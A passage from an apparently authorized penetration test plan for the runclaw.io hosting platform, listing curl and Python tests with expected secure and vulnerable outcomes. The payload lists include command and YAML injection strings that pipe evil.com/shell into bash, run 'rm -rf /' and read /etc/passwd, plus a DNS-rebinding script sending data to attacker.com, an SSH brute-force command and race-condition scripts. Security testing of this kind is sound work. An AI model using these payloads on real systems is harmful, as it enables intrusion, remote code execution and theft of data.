   for payload in "${PAYLOADS[@]}"; do
     echo "Testing: $payload"
     curl -s -X POST "https://runclaw.io/api/instances/create" \
       -H "Cookie: a_session_<PROJECT_ID>=$SESSION" \
       -H "Content-Type: application/json" \
       -d "{\"subdomain\":\"$payload\",\"plan\":\"starter\"}" | jq .
     echo "---"
   done
   ```

2. Test cloud-init YAML injection via subdomain. The `generateCloudInit` function uses `.replace(/{SUBDOMAIN}/g, subdomain)` which could allow YAML injection if the subdomain contains newline characters:
   ```bash
   # URL-encoded newline injection attempting to add runcmd directive
   YAML_PAYLOADS=(
     'test%0aruncmd%3a%0a%20%20-%20curl%20evil.com'
     'test\nruncmd:\n  - curl evil.com/shell|bash'
     'test%0d%0aruncmd:%0d%0a  - id > /tmp/pwned'
   )

   for payload in "${YAML_PAYLOADS[@]}"; do
     echo "Testing YAML injection: $payload"
     curl -s -X POST "https://runclaw.io/api/instances/create" \
       -H "Cookie: a_session_<PROJECT_ID>=$SESSION" \
       -H "Content-Type: application/json" \
       --data-raw "{\"subdomain\":\"$payload\",\"plan\":\"starter\"}"
     echo "---"
   done
   ```

3. Test Cloudflare DNS header injection via subdomain. The subdomain is used in `${subdomain}.runclaw.io` for the DNS name field:
   ```bash
   HEADER_PAYLOADS=(
     'test.evil.com'
     'test%00.evil.com'
     '*.runclaw.io'
     'test\r\nX-Injected: true'
   )

   for payload in "${HEADER_PAYLOADS[@]}"; do
     echo "Testing header injection: $payload"
     curl -s -X POST "https://runclaw.io/api/instances/create" \
       -H "Cookie: a_session_<PROJECT_ID>=$SESSION" \
       -H "Content-Type: application/json" \
       -d "{\"subdomain\":\"$payload\",\"plan\":\"starter\"}"
     echo "---"
   done
   ```

4. Test Hetzner server name injection. Server name is `claw-{subdomain}`:
   ```bash
   NAME_PAYLOADS=(
     'test;rm -rf /'
     'test$(curl evil.com)'
     '../../../etc/passwd'
     'test%00admin'
   )

   for payload in "${NAME_PAYLOADS[@]}"; do
     echo "Testing name injection: $payload"
     curl -s -X POST "https://runclaw.io/api/instances/create" \
       -H "Cookie: a_session_<PROJECT_ID>=$SESSION" \
       -H "Content-Type: application/json" \
       -d "{\"subdomain\":\"$payload\",\"plan\":\"starter\"}"
     echo "---"
   done
   ```

**Expected Result (Secure):** All payloads rejected by subdomain validation (3-20 chars, lowercase alphanumeric + hyphens only, regex: `/^[a-z0-9]([a-z0-9-]{1,18}[a-z0-9])?$/`). The server returns HTTP 400 with `INVALID_SUBDOMAIN` error. No payload reaches Hetzner, Cloudflare, or cloud-init.

**Expected Result (Vulnerable):** Payloads pass validation and reach external APIs. Commands execute in cloud-init on the VPS. DNS records created with injected domains. YAML injection adds malicious runcmd directives.

**Evidence Collection:** Record all requests, responses, and any out-of-band callbacks (set up a Burp Collaborator or interactsh listener). If testing cloud-init injection, check the VPS for evidence of command execution.

**Severity if Found:** Cloud-init command injection: CVSS 9.8 (Critical). YAML injection: CVSS 9.8 (Critical). DNS injection: CVSS 8.1 (High). Hetzner name injection: CVSS 6.5 (Medium).

---

### 4.2 JSON Injection in API Bodies

**Objective:** Test JSON body parsing for injection vulnerabilities in all POST endpoints.

**Prerequisites:** Burp Suite, authorized session.

**Steps:**

1. Test prototype pollution in instance creation:
   ```bash
   curl -s -X POST "https://runclaw.io/api/instances/create" \
     -H "Cookie: a_session_<PROJECT_ID>=$SESSION" \
     -H "Content-Type: application/json" \
     -d '{
       "subdomain": "test123",
       "plan": "starter",
       "__proto__": {"isAdmin": true},
       "constructor": {"prototype": {"isAdmin": true}}
     }'
   ```

2. Test parameter pollution (duplicate keys):
   ```bash
   curl -s -X POST "https://runclaw.io/api/instances/create" \
     -H "Cookie: a_session_<PROJECT_ID>=$SESSION" \
     -H "Content-Type: application/json" \
     -d '{
       "subdomain": "test123",
       "plan": "starter",
       "plan": "dedicated",
       "user_id": "other-user-id"
     }'
   ```

3. Test injecting extra fields that map to database columns:
   ```bash
   curl -s -X POST "https://runclaw.io/api/instances/create" \
     -H "Cookie: a_session_<PROJECT_ID>=$SESSION" \
     -H "Content-Type: application/json" \
     -d '{
       "subdomain": "test123",
       "plan": "starter",
       "status": "running",
       "stripe_subscription_id": "sub_fake123",
       "callback_secret": "known-secret",
       "hetzner_server_id": 12345
     }'
   ```

4. Test large payload handling:
   ```bash
   # Generate a 10MB JSON payload
   python3 -c "
   import json
   payload = {'subdomain': 'test123', 'plan': 'starter', 'junk': 'A' * 10000000}
   print(json.dumps(payload))
   " | curl -s -X POST "https://runclaw.io/api/instances/create" \
     -H "Cookie: a_session_<PROJECT_ID>=$SESSION" \
     -H "Content-Type: application/json" \
     -d @-
   ```

**Expected Result (Secure):** Prototype pollution has no effect (using safe JSON parsing). Extra fields are ignored. Only `subdomain`, `plan`, and `region` are extracted from the request body. Large payloads rejected with 413.

**Expected Result (Vulnerable):** Prototype pollution modifies object behavior. Extra fields injected into database record. Attacker can set their own `callback_secret` or `status`.

**Evidence Collection:** Record all requests and responses. If extra fields are accepted, verify by listing instances.

**Severity if Found:** Mass assignment (setting callback_secret): CVSS 9.1 (Critical). Prototype pollution: CVSS 7.5 (High). Missing payload size limits: CVSS 5.3 (Medium).

---

### 4.3 SSRF via Instance URL Manipulation

**Objective:** Test whether the health check cron job can be tricked into making requests to internal services (SSRF).

**Prerequisites:** Understanding of health check mechanism, ability to manipulate instance records (or create a controlled subdomain).

**Steps:**

1. If you can register a subdomain that resolves to an internal IP:
   ```bash
   # Create an instance with a subdomain you control
   # Then point the DNS to an internal address via DNS rebinding
   ```

2. Check if the health check follows redirects to internal addresses:
   ```bash
   # Set up a controlled server that redirects:
   # https://testpentest.runclaw.io/health -> http://169.254.169.254/latest/meta-data/
   # (Hetzner metadata service)
   ```

3. Test if instance subdomain can point to cloud metadata:
   ```bash
   # If you can control DNS for your subdomain:
   # Point it to 169.254.169.254 (cloud metadata)
   # Wait for health check to hit it
   ```

4. Check if Cloudflare API calls are vulnerable to SSRF:
   ```bash
   # The deleteDnsRecord function queries Cloudflare with the subdomain
   # Test if subdomain injection in the query parameter causes SSRF
   curl -s -X POST "https://runclaw.io/api/instances/create" \
     -H "Cookie: a_session_<PROJECT_ID>=$SESSION" \
     -H "Content-Type: application/json" \
     -d '{"subdomain":"test.evil.com%23","plan":"starter"}'
   ```

**Expected Result (Secure):** Health checks only reach the expected subdomain. No redirect following to internal IPs. Metadata service (169.254.169.254) blocked. Cloudflare API calls properly parameterized.

**Expected Result (Vulnerable):** Health checks can be redirected to internal services. Cloud metadata accessible via SSRF. Cloudflare API calls vulnerable to parameter injection.

**Evidence Collection:** Record any internal data retrieved via SSRF. Log redirect chains.

**Severity if Found:** SSRF to cloud metadata: CVSS 9.1 (Critical). SSRF to internal services: CVSS 7.5 (High).

---

## Phase 5: Business Logic Testing

### 5.1 Instance Creation Without Subscription

**Objective:** Test whether a user can create an instance without an active Stripe subscription (bypassing payment).

**Prerequisites:** Test account WITHOUT an active subscription.

**Steps:**

1. Login with an account that has no subscription:
   ```bash
   RESP=$(curl -s -X POST "https://cloud.appwrite.io/v1/account/sessions/email" \
     -H "X-Appwrite-Project: <PROJECT_ID>" \
     -H "Content-Type: application/json" \
     -d '{"email":"nopay@runclaw.io","password":"<pass>"}')
   SESSION_NOPAY=$(echo "$RESP" | jq -r '.secret')
   ```

2. Attempt to create an instance:
   ```bash
   curl -s -X POST "https://runclaw.io/api/instances/create" \
     -H "Cookie: a_session_<PROJECT_ID>=$SESSION_NOPAY" \
     -H "Content-Type: application/json" \
     -d '{"subdomain":"freeloader","plan":"starter"}'
   ```

3. Try creating with a fake subscription ID in the request:
   ```bash
   curl -s -X POST "https://runclaw.io/api/instances/create" \
     -H "Cookie: a_session_<PROJECT_ID>=$SESSION_NOPAY" \
     -H "Content-Type: application/json" \
     -d '{
       "subdomain":"freeloader2",
       "plan":"starter",
       "stripe_subscription_id":"sub_fake_1234567890"
     }'
   ```

**Expected Result (Secure):** Returns HTTP 402 with `NO_ACTIVE_SUBSCRIPTION` error. The server verifies the subscription status with Stripe API (server-side), not from the client request body.

**Expected Result (Vulnerable):** Instance created without payment. Accepting `stripe_subscription_id` from the client request.

**Evidence Collection:** Record the responses.

**Severity if Found:** CVSS 8.1 (High) - Financial loss, free resource consumption.

---

### 5.2 Race Condition in Instance Creation

**Objective:** Test whether rapid concurrent requests can bypass instance limits or create duplicate subdomains.

**Prerequisites:** Account with active subscription, Burp Suite Turbo Intruder or custom Python script.

**Steps:**

1. Create a race condition test script:
   ```python
   #!/usr/bin/env python3
   """Race condition test for instance creation."""
   import asyncio
   import aiohttp
   import json

   URL = "https://runclaw.io/api/instances/create"
   COOKIE = "a_session_<PROJECT_ID>=<SESSION_TOKEN>"
   CONCURRENT = 20

   async def create_instance(session: aiohttp.ClientSession, idx: int) -> dict:
       headers = {
           "Cookie": COOKIE,
           "Content-Type": "application/json"
       }
       payload = {"subdomain": f"racetest", "plan": "starter"}
       async with session.post(URL, headers=headers,
                               json=payload) as resp:
           body = await resp.json()
           return {"index": idx, "status": resp.status, "body": body}

   async def main():
       async with aiohttp.ClientSession() as session:
           tasks = [create_instance(session, i) for i in range(CONCURRENT)]
           results = await asyncio.gather(*tasks)
           successes = [r for r in results if r["status"] == 201]
           print(f"Successes: {len(successes)} / {CONCURRENT}")
           for r in results:
               print(f"  [{r['index']}] {r['status']}: "
                     f"{json.dumps(r['body'], indent=None)[:120]}")

   asyncio.run(main())
   ```

2. Run the script and analyze results.

3. Also test instance limit bypass:
   ```python
   # If plan allows 1 instance, try creating multiple concurrently
   async def create_many(session, idx):
       payload = {"subdomain": f"race{idx:03d}", "plan": "starter"}
       headers = {"Cookie": COOKIE, "Content-Type": "application/json"}
       async with session.post(URL, headers=headers, json=payload) as resp:
           return {"index": idx, "status": resp.status,
                   "body": await resp.json()}

   # Launch 10 concurrent creation requests
   tasks = [create_many(session, i) for i in range(10)]
   ```

4. After testing, check the actual state:
   ```bash
   curl -s "https://runclaw.io/api/instances/list" \
     -H "Cookie: a_session_<PROJECT_ID>=$SESSION" | jq '.instances | length'
   ```

**Expected Result (Secure):** Only one instance created for duplicate subdomain requests. Instance limit enforced even under concurrent requests. Database uniqueness constraint prevents duplicates. Proper locking or atomic check-and-create.

**Expected Result (Vulnerable):** Multiple instances created with the same subdomain. Instance limit exceeded. Multiple Hetzner servers provisioned (cost amplification).

**Evidence Collection:** Record all responses. Check Hetzner for duplicate servers. Record the instance list showing duplicates.

**Severity if Found:** Duplicate instances: CVSS 6.5 (Medium). Instance limit bypass: CVSS 7.5 (High). Cost amplification: CVSS 8.1 (High).

---

### 5.3 Plan Manipulation

**Objective:** Test whether a user can request a higher-tier server while paying for a lower-tier plan.

**Prerequisites:** Account with "starter" subscription.

**Steps:**

1. Create instance requesting a higher plan than subscribed:
   ```bash
   curl -s -X POST "https://runclaw.io/api/instances/create" \
     -H "Cookie: a_session_<PROJECT_ID>=$SESSION" \
     -H "Content-Type: application/json" \
     -d '{"subdomain":"upgrade1","plan":"dedicated"}'
   ```

2. Try injecting server_type directly:
   ```bash
   curl -s -X POST "https://runclaw.io/api/instances/create" \
     -H "Cookie: a_session_<PROJECT_ID>=$SESSION" \
     -H "Content-Type: application/json" \
     -d '{"subdomain":"upgrade2","plan":"starter","server_type":"cx42"}'
   ```

3. Try injecting region to a premium datacenter:
   ```bash
   curl -s -X POST "https://runclaw.io/api/instances/create" \
     -H "Cookie: a_session_<PROJECT_ID>=$SESSION" \
     -H "Content-Type: application/json" \
     -d '{"subdomain":"upgrade3","plan":"starter","region":"ash"}'
   ```

4. If instance is created, verify what server type was actually provisioned:
   ```bash
   curl -s "https://runclaw.io/api/instances/list" \
     -H "Cookie: a_session_<PROJECT_ID>=$SESSION" | jq '.instances[-1]'
   ```

**Expected Result (Secure):** Server rejects plan mismatch (plan must match subscription tier). `server_type` from client request is ignored; server derives it from the subscription via `planToServerType()`. Region validated against allowed list.

**Expected Result (Vulnerable):** User gets a dedicated server (cx42) while paying for starter (cx22). Client-supplied `server_type` accepted.

**Evidence Collection:** Record requests, responses, and the actual instance details. Compare Hetzner server type with the subscription plan.

**Severity if Found:** CVSS 7.5 (High) - Financial loss from resource theft.

---

### 5.4 Stripe Webhook Replay Attack

**Objective:** Test whether old Stripe webhook events can be replayed to manipulate subscriptions or trigger duplicate actions.

**Prerequisites:** Previously captured Stripe webhook payload, Burp Suite.

**Steps:**

1. Capture a legitimate webhook event (from Stripe dashboard test mode or Burp):
   ```bash
   # Record the full request including Stripe-Signature header
   # from a checkout.session.completed event
   ```

2. Replay the exact same event:
   ```bash
   curl -s -X POST "https://runclaw.io/api/stripe/webhook" \
     -H "Content-Type: application/json" \
     -H "Stripe-Signature: t=<original_timestamp>,v1=<original_sig>" \
     -d '<original_payload>'
   ```

3. Replay with modified timestamp (keeping same signature):
   ```bash
   CURRENT_TS=$(date +%s)
   curl -s -X POST "https://runclaw.io/api/stripe/webhook" \
     -H "Content-Type: application/json" \
     -H "Stripe-Signature: t=$CURRENT_TS,v1=<original_sig>" \
     -d '<original_payload>'
   ```

4. Test idempotency - replay the same event_id:
   ```bash
   # The same event.id should be rejected on second processing
   # Check webhook_events collection for duplicate entries
   ```

5. Test without Stripe-Signature header:
   ```bash
   curl -s -X POST "https://runclaw.io/api/stripe/webhook" \
     -H "Content-Type: application/json" \
     -d '{"type":"customer.subscription.deleted","data":{"object":{"id":"sub_target"}}}'
   ```

**Expected Result (Secure):** Replayed events rejected due to timestamp tolerance (Stripe SDK rejects signatures older than 300 seconds by default). Duplicate event_id detected via idempotency check and returns 200 without re-processing. Missing or invalid signature returns 400.

**Expected Result (Vulnerable):** Old events accepted. Duplicate processing occurs. Events accepted without signature verification.

**Evidence Collection:** Record all requests and responses. Check if any database state changed from replayed events.

**Severity if Found:** No signature verification: CVSS 9.8 (Critical). Missing idempotency: CVSS 6.5 (Medium). Timestamp tolerance too wide: CVSS 5.3 (Medium).

---

### 5.5 Callback Secret Prediction

**Objective:** Assess the randomness of the `callback_secret` generated for each instance.

**Prerequisites:** Multiple test instances, access to instance records (via Appwrite or API).

**Steps:**

1. Create multiple instances and collect callback secrets (via direct Appwrite access if server key available in test environment):
   ```bash
   # Create 20 instances and record the callback secrets
   for i in $(seq 1 20); do
     curl -s -X POST "https://runclaw.io/api/instances/create" \
       -H "Cookie: a_session_<PROJECT_ID>=$SESSION" \
       -H "Content-Type: application/json" \
       -d "{\"subdomain\":\"secrettest$i\",\"plan\":\"starter\"}"
     sleep 1
   done
   ```

2. If callback secrets are accessible, analyze them:
   ```python
   #!/usr/bin/env python3
   """Analyze callback secret randomness."""
   import collections

   secrets = [
       # Paste collected secrets here
   ]

   # Check length consistency
   lengths = [len(s) for s in secrets]
   print(f"Lengths: {set(lengths)}")

   # Check character set
   chars = set("".join(secrets))
   print(f"Character set: {''.join(sorted(chars))}")
   print(f"Unique chars: {len(chars)}")

   # Check for patterns
   for i, s in enumerate(secrets):
       print(f"Secret {i}: {s[:16]}...{s[-16:]}")

   # Entropy estimate
   import math
   charset_size = len(chars)
   secret_length = lengths[0] if len(set(lengths)) == 1 else min(lengths)
   entropy_bits = secret_length * math.log2(charset_size)
   print(f"\nEstimated entropy: {entropy_bits:.0f} bits")
   print(f"Brute force attempts needed: 2^{entropy_bits:.0f}")
   ```

3. Verify that `crypto.randomBytes(32)` is actually used (not `Math.random()` or similar):
   ```bash
   # Check if secrets have patterns suggesting weak PRNG
   # crypto.randomBytes(32).toString('hex') produces 64 hex chars
   # Math.random() would show patterns
   ```

**Expected Result (Secure):** Secrets are 64 hex characters (32 bytes = 256 bits entropy). No patterns detected. Generated using `crypto.randomBytes(32)`.

**Expected Result (Vulnerable):** Short secrets. Predictable patterns. Sequential or timestamp-based generation. Low entropy.

**Evidence Collection:** Save all collected secrets and analysis results.

**Severity if Found:** Predictable secrets: CVSS 9.8 (Critical). Low entropy: CVSS 8.1 (High).

---

## Phase 6: Infrastructure Testing

### 6.1 Cloudflare Bypass via Direct IP

**Objective:** Test whether customer VPS instances can be accessed directly by IP, bypassing Cloudflare protection.

**Prerequisites:** Target VPS IP address (from reconnaissance phase), curl.

**Steps:**

1. Test direct HTTP access:
   ```bash
   TARGET_IP="<VPS_IP>"
   SUBDOMAIN="<known_subdomain>"

   # Direct IP with Host header
   curl -sk "https://$TARGET_IP/" -H "Host: $SUBDOMAIN.runclaw.io" -v 2>&1

   # Direct IP without Host header
   curl -sk "https://$TARGET_IP/" -v 2>&1

   # Direct HTTP (non-TLS)
   curl -s "http://$TARGET_IP/" -H "Host: $SUBDOMAIN.runclaw.io" -v 2>&1
   ```

2. Test if Caddy responds to any hostname:
   ```bash
   curl -sk "https://$TARGET_IP/" -H "Host: evil.com" -v 2>&1
   curl -sk "https://$TARGET_IP/" -H "Host: localhost" -v 2>&1
   ```

3. Check if Caddy admin API is exposed:
   ```bash
   curl -s "http://$TARGET_IP:2019/config/" 2>&1
   curl -s "http://$TARGET_IP:2019/reverse_proxy/upstreams" 2>&1
   ```

**Expected Result (Secure):** Direct IP access either blocked (firewall) or returns Caddy's default page (not the application). Caddy only responds to the configured subdomain. Admin API not exposed externally.

**Expected Result (Vulnerable):** Full application accessible via direct IP. Caddy admin API exposed. Application serves content for any Host header.

**Evidence Collection:** Save all curl outputs and response bodies.

**Severity if Found:** Full bypass: CVSS 7.5 (High). Admin API exposed: CVSS 9.1 (Critical).

---

### 6.2 VPS Port Scanning

**Objective:** Verify that only expected ports are open on customer VPS instances.

**Prerequisites:** nmap, target VPS IP.

**Steps:**

1. Full TCP port scan:
   ```bash
   nmap -sT -p- --min-rate 5000 -oN infra/nmap-full-tcp.txt $TARGET_IP
   ```

2. UDP scan on common ports:
   ```bash
   nmap -sU --top-ports 100 -oN infra/nmap-udp.txt $TARGET_IP
   ```

3. Service version detection on open ports:
   ```bash
   nmap -sV -p <open_ports> -oN infra/nmap-versions.txt $TARGET_IP
   ```

4. Check UFW status (if SSH access available in test environment):
   ```bash
   ssh root@$TARGET_IP "ufw status verbose"
   ```

**Expected Result (Secure):** Only ports 22 (SSH), 80 (HTTP), and 443 (HTTPS) open. UFW configured as specified in cloud-init. No unexpected services running.

**Expected Result (Vulnerable):** Additional ports open (Docker API 2375/2376, databases, monitoring). Docker socket exposed. Hetzner metadata service accessible.

**Evidence Collection:** Save all nmap scan outputs.

**Severity if Found:** Docker API exposed: CVSS 9.8 (Critical). Extra services: CVSS 5.3-7.5 (Medium-High depending on service).

---

### 6.3 Docker Escape Testing

**Objective:** Test whether the OpenClaw container can escape Docker isolation to access the host system.

**Prerequisites:** SSH access to test VPS, docker CLI.

**Steps:**

1. Check Docker configuration:
   ```bash
   ssh testuser@$TARGET_IP << 'REMOTE'
   # Check if Docker socket is mounted into container
   docker inspect openclaw-openclaw-1 | jq '.[0].HostConfig.Binds'

   # Check container capabilities
   docker inspect openclaw-openclaw-1 | jq '.[0].HostConfig.CapAdd'

   # Check if privileged mode
   docker inspect openclaw-openclaw-1 | jq '.[0].HostConfig.Privileged'

   # Check if host network mode
   docker inspect openclaw-openclaw-1 | jq '.[0].HostConfig.NetworkMode'

   # Check PID namespace
   docker inspect openclaw-openclaw-1 | jq '.[0].HostConfig.PidMode'

   # Check AppArmor/Seccomp profile
   docker inspect openclaw-openclaw-1 | jq '.[0].HostConfig.SecurityOpt'
   REMOTE
   ```

2. Check if container can access Docker socket:
   ```bash
   ssh testuser@$TARGET_IP << 'REMOTE'
   docker exec openclaw-openclaw-1 ls -la /var/run/docker.sock 2>&1
   REMOTE
   ```

3. Check if container can access host metadata:
   ```bash
   ssh testuser@$TARGET_IP << 'REMOTE'
   docker exec openclaw-openclaw-1 curl -s http://169.254.169.254/latest/meta-data/ 2>&1
   REMOTE
   ```

4. Run docker-bench-security:
   ```bash
   ssh testuser@$TARGET_IP << 'REMOTE'
   docker run --rm --net host --pid host --userns host --cap-add audit_control \
     -e DOCKER_CONTENT_TRUST=$DOCKER_CONTENT_TRUST \
     -v /var/lib:/var/lib:ro \
     -v /var/run/docker.sock:/var/run/docker.sock:ro \
     -v /etc:/etc:ro \
     docker/docker-bench-security
   REMOTE
   ```

**Expected Result (Secure):** Container runs as non-root user. No Docker socket mounted. No extra capabilities. Not privileged mode. Seccomp/AppArmor profile applied. Cannot access host metadata.

**Expected Result (Vulnerable):** Docker socket mounted (full host compromise). Running as root. Privileged mode enabled. No security profiles. Can access host metadata.

**Evidence Collection:** Save docker inspect output and docker-bench-security results.

**Severity if Found:** Docker socket mounted: CVSS 9.8 (Critical). Privileged mode: CVSS 9.8 (Critical). Running as root: CVSS 6.5 (Medium).

---

### 6.4 SSH Security Testing

**Objective:** Verify SSH hardening on customer VPS instances.

**Prerequisites:** nmap, ssh-audit tool.

**Steps:**

1. Check SSH configuration:
   ```bash
   ssh-audit $TARGET_IP > infra/ssh-audit.txt
   ```

2. Test password authentication (should be disabled):
   ```bash
   ssh -o PreferredAuthentications=password -o PubkeyAuthentication=no \
     root@$TARGET_IP 2>&1
   ```

3. Test root login (should be disabled):
   ```bash
   ssh -o PreferredAuthentications=publickey root@$TARGET_IP 2>&1
   ```

4. Check fail2ban status:
   ```bash
   # If SSH access is available
   ssh testuser@$TARGET_IP "sudo fail2ban-client status sshd"
   ```

5. Attempt SSH brute force (limited, authorized only):
   ```bash
   # Use hydra for a controlled 10-attempt brute force
   hydra -l root -P /usr/share/seclists/Passwords/Common-Credentials/top-10.txt \
     ssh://$TARGET_IP -t 4 -V 2>&1 | head -30
   ```

**Expected Result (Secure):** Password auth disabled. Root login disabled. Only key-based auth. fail2ban active and banning after 3 attempts. Strong cipher suites only.

**Expected Result (Vulnerable):** Password auth enabled. Root login allowed. Weak ciphers. No fail2ban.

**Evidence Collection:** Save ssh-audit output, authentication test results, fail2ban status.

**Severity if Found:** Password auth enabled: CVSS 7.5 (High). Root login: CVSS 8.1 (High). No fail2ban: CVSS 5.3 (Medium).

---

### 6.5 DNS Rebinding Attack

**Objective:** Test whether DNS rebinding can be used to access customer VPS services that should only be available on localhost.

**Prerequisites:** Controlled DNS server, custom domain.

**Steps:**

1. Set up a DNS rebinding attack:
   ```
   # Configure a DNS server for attacker-domain.com:
   # First query:  attacker-domain.com -> <attacker_IP>
   # Second query: attacker-domain.com -> 127.0.0.1
   ```

2. Create a page on attacker_IP that makes requests to the now-rebinding domain:
   ```html
   <!-- Page on attacker server -->
   <script>
   // Wait for DNS cache to expire, then:
   fetch('http://attacker-domain.com:3000/health')
     .then(r => r.text())
     .then(data => {
       // Send data to attacker server
       fetch('https://attacker.com/exfil?data=' + encodeURIComponent(data));
     });
   </script>
   ```

3. If the health check endpoint at `localhost:3000` returns sensitive information, this could be exploited.

4. Check if OpenClaw's internal API is accessible on localhost:
   ```bash
   # From inside the VPS (if SSH access available)
   curl -s http://localhost:3000/ | head -50
   curl -s http://localhost:3000/health
   curl -s http://localhost:3000/api/ 2>&1 | head -50
   ```

**Expected Result (Secure):** Caddy validates the Host header. DNS rebinding blocked. Internal API not exposed beyond expected endpoints. CORS headers properly configured.

**Expected Result (Vulnerable):** DNS rebinding successful, attacker can access localhost services. Internal API data accessible.

**Evidence Collection:** Record the attack chain, DNS resolution logs, and any data exfiltrated.

**Severity if Found:** CVSS 6.5 (Medium) to CVSS 8.1 (High) depending on exposed data.

---

## Phase 7: Cron Job and Background Process Testing

### 7.1 Cron Endpoint Access Without Secret

**Objective:** Test whether cron endpoints can be accessed without the `CRON_SECRET` bearer token.

**Prerequisites:** curl.

**Steps:**

1. Access cron endpoints without authorization:
   ```bash
   # Health check
   curl -s "https://runclaw.io/api/cron/health"

   # Reconcile
   curl -s "https://runclaw.io/api/cron/reconcile"

   # Provision timeout
   curl -s "https://runclaw.io/api/cron/provision-timeout"
   ```

2. Test with common/weak bearer tokens:
   ```bash
   WEAK_TOKENS=("" "cron" "secret" "password" "admin" "vercel" "test")
   for token in "${WEAK_TOKENS[@]}"; do
     echo "Testing token: '$token'"
     curl -s -o /dev/null -w "%{http_code}" \
       "https://runclaw.io/api/cron/health" \
       -H "Authorization: Bearer $token"
   done
   ```

3. Test with no Authorization header but with query parameter:
   ```bash
   curl -s "https://runclaw.io/api/cron/health?secret=<guessed_value>"
   ```

4. Test if the cron endpoints accept POST (method confusion):
   ```bash
   curl -s -X POST "https://runclaw.io/api/cron/health"
   curl -s -X POST "https://runclaw.io/api/cron/reconcile"
   ```

**Expected Result (Secure):** All requests without valid `CRON_SECRET` return 401 Unauthorized. Weak tokens rejected. Query parameter secrets not accepted. Only GET method accepted.

**Expected Result (Vulnerable):** Cron endpoints accessible without authentication. Attacker can trigger health checks, reconciliation, or provision timeouts at will.

**Evidence Collection:** Record all requests and response codes.

**Severity if Found:** Unauthenticated cron access: CVSS 7.5 (High). Reconcile endpoint (can delete servers): CVSS 9.1 (Critical).

---

### 7.2 Health Check Manipulation

**Objective:** Test whether an attacker can manipulate health check results to affect instance status.

**Prerequisites:** Controlled VPS instance, understanding of health check flow.

**Steps:**

1. Check what the health check endpoint expects:
   ```bash
   curl -s "https://<subdomain>.runclaw.io/health" -v 2>&1
   ```

2. If you control a VPS, make the health endpoint return different responses:
   ```bash
   # On the controlled VPS, modify the health endpoint to always fail
   # This should eventually mark the instance as "unhealthy"

   # Then make it return 200 again
   # This should recover to "running"
   ```

3. Test if a third party can send fake health responses. Check if the health check verifies the response source:
   ```bash
   # The cron job fetches https://{subdomain}.runclaw.io/health
   # If DNS is poisoned, the response could come from an attacker
   ```

4. Test health check amplification - can triggering the cron endpoint repeatedly cause excessive outbound requests:
   ```bash
   for i in $(seq 1 100); do
     curl -s "https://runclaw.io/api/cron/health" \
       -H "Authorization: Bearer <CRON_SECRET_IF_KNOWN>" &
   done
   wait
   ```

**Expected Result (Secure):** Health check verifies SSL certificate. Status transitions follow defined logic (3 consecutive failures required). Cron endpoint has rate limiting. Health check requests have short timeouts (5 seconds as specified).

**Expected Result (Vulnerable):** Health status easily manipulated. No consecutive failure requirement. Cron endpoint can be spammed.

**Evidence Collection:** Document health check behavior and status transitions.

**Severity if Found:** Status manipulation: CVSS 5.3 (Medium). Health check amplification: CVSS 6.5 (Medium).

---

### 7.3 Provision Timeout Manipulation

**Objective:** Test whether an attacker can keep instances in "provisioning" state to prevent timeout cleanup or abuse timeout logic.

**Prerequisites:** Test account, understanding of provisioning flow.

**Steps:**

1. Create an instance and prevent the ready callback:
   ```bash
   # Create instance
   curl -s -X POST "https://runclaw.io/api/instances/create" \
     -H "Cookie: a_session_<PROJECT_ID>=$SESSION" \
     -H "Content-Type: application/json" \
     -d '{"subdomain":"timeouttest","plan":"starter"}'
   ```

2. Wait 10+ minutes and check if provision-timeout cleans it up:
   ```bash
   # After 10 minutes
   curl -s "https://runclaw.io/api/instances/list" \
     -H "Cookie: a_session_<PROJECT_ID>=$SESSION" | jq .
   ```

3. Test if the user can manually send the ready callback to reset the timer:
   ```bash
   # This should fail because we don't know the callback_secret
   curl -s -X POST "https://runclaw.io/api/instances/ready" \
     -H "Content-Type: application/json" \
     -d '{"instance_id":"<ID>","callback_secret":"guess"}'
   ```

4. Create many instances rapidly to overwhelm the timeout system:
   ```bash
   for i in $(seq 1 20); do
     curl -s -X POST "https://runclaw.io/api/instances/create" \
       -H "Cookie: a_session_<PROJECT_ID>=$SESSION" \
       -H "Content-Type: application/json" \
       -d "{\"subdomain\":\"flood$i\",\"plan\":\"starter\"}" &
   done
   wait
   ```

**Expected Result (Secure):** Timed-out instances properly cleaned up (Hetzner server deleted, DNS removed, status set to "failed"). Instance limit prevents mass creation. Cannot send ready callback without correct secret.

**Expected Result (Vulnerable):** Timed-out instances leave orphaned Hetzner servers running (cost leak). Mass creation bypasses limits. Timeout system overwhelmed.

**Evidence Collection:** Record instance states before and after timeout. Check Hetzner for orphaned servers.

**Severity if Found:** Orphaned servers: CVSS 6.5 (Medium). Cost amplification: CVSS 7.5 (High).

---

## Phase 8: Data Exfiltration Testing

### 8.1 Appwrite API Key Exposure

**Objective:** Test whether the Appwrite server API key is exposed in client-side code, environment variables, or error messages.

**Prerequisites:** Browser DevTools, curl.

**Steps:**

1. Search all client-side JavaScript for API keys:
   ```bash
   # Download and search all JS bundles
   curl -s https://runclaw.io | grep -oP '/_next/static/[^"]+\.js' | while read js; do
     echo "Checking $js"
     curl -s "https://runclaw.io$js" | grep -i "appwrite_api_key\|APPWRITE_API_KEY\|apiKey\|api_key" || true
   done
   ```

2. Check for environment variable leakage in `__NEXT_DATA__`:
   ```bash
   curl -s https://runclaw.io | grep -o '__NEXT_DATA__[^<]*' | \
     python3 -c "
   import sys, json
   data = sys.stdin.read()
   # Extract the JSON
   start = data.index('{')
   j = json.loads(data[start:])
   print(json.dumps(j, indent=2))
   " 2>/dev/null
   ```

3. Trigger error conditions to look for stack traces with secrets:
   ```bash
   # Send malformed requests
   curl -s -X POST "https://runclaw.io/api/instances/create" \
     -H "Content-Type: application/json" \
     -d 'not-json'

   curl -s -X POST "https://runclaw.io/api/instances/create" \
     -H "Content-Type: application/json" \
     -d '{"subdomain": null}'

   curl -s "https://runclaw.io/api/nonexistent-endpoint"
   ```

4. Check for exposed `.env` files and configuration:
   ```bash
   for path in .env .env.local .env.production .env.development \
     env.json config.json next.config.js vercel.json; do
     STATUS=$(curl -s -o /dev/null -w "%{http_code}" "https://runclaw.io/$path")
     echo "$STATUS $path"
   done
   ```

**Expected Result (Secure):** No API keys in client-side code. `NEXT_PUBLIC_*` variables contain only public project ID and endpoint. Error messages generic (no stack traces). Config files not accessible.

**Expected Result (Vulnerable):** Appwrite server API key found in client JS. Stack traces reveal environment variables. Config files accessible.

**Evidence Collection:** Save any discovered keys (report immediately). Screenshot source code locations.

